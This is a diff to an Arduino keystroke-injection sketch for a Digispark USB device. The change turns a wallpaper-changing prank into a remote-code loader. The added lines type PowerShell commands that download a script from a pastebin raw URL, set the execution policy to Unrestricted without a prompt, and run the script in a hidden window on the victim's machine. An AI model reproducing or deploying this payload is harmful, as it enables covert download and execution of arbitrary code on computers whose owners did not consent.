@@ -15,7 +15,7 @@ void loop() {
   DigiKeyboard.delay(500);
 
  DigiKeyboard.println("msconfig -5"); // Access CMD
-    DigiKeyboard.delay(1000);
+    DigiKeyboard.delay(1000); 
     for(int i = 0; i < 14; i++) {
         DigiKeyboard.sendKeyStroke(KEY_DOWN);
     }
@@ -24,23 +24,26 @@ void loop() {
   
   DigiKeyboard.println("powershell");
   DigiKeyboard.println("$path = \"$env:USERPROFILE\\wallpaper.jpg\"");
+  DigiKeyboard.println("$path2 = \"$env:USERPROFILE\\script.ps1\"");
   DigiKeyboard.println("$client = new-object System.Net.WebClient");
   DigiKeyboard.println("Remove-Item $path");
   DigiKeyboard.delay(200);
   DigiKeyboard.println("$client.DownloadFile(\""link"\" , $path)");
   DigiKeyboard.delay(10000);
 
-  DigiKeyboard.println("Set-ItemProperty -Path \"HKCU:\\Control Panel\\Desktop\\\" -Name wallpaper -Value $path");
+
+
   DigiKeyboard.delay(500);
-  
-  DigiKeyboard.println("taskkill /f /im explorer.exe");
+  DigiKeyboard.print("$client.DownloadFile(\"https://pastebin.com/raw/KfR02ySi\" , \"script.ps1\")");
   DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT | KEY_R);
+  DigiKeyboard.delay(750);
 
-  DigiKeyboard.println("start explorer.exe");
-  DigiKeyboard.delay(3000);
-
-  DigiKeyboard.println("logoff");
+  DigiKeyboard.println("powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false");
+  DigiKeyboard.delay(750);
+  DigiKeyboard.println("powershell.exe -windowstyle hidden -File %USERPROFILE%\\script.ps1");
   
+
   digitalWrite(1, LOW);
   for(;;){}
 }
